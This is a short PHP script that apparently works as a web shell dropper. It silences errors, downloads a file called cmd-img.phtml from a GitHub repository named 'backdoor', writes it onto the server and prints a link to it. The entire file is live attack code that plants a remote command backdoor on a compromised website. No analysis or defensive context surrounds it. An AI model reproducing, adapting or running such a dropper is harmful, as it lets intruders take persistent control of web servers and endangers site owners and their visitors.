<?php
error_reporting(0);
$shell = fopen("cmd-img.phtml", "w");
$file_shell = file_get_contents("https://raw.githubusercontent.com/kakaroot1337/backdoor/main/cmd-img.phtml");
fwrite($shell, $file_shell);
fclose($shell);
echo "<a href='cmd-img.phtml'>Here Boyz</a>";
?>
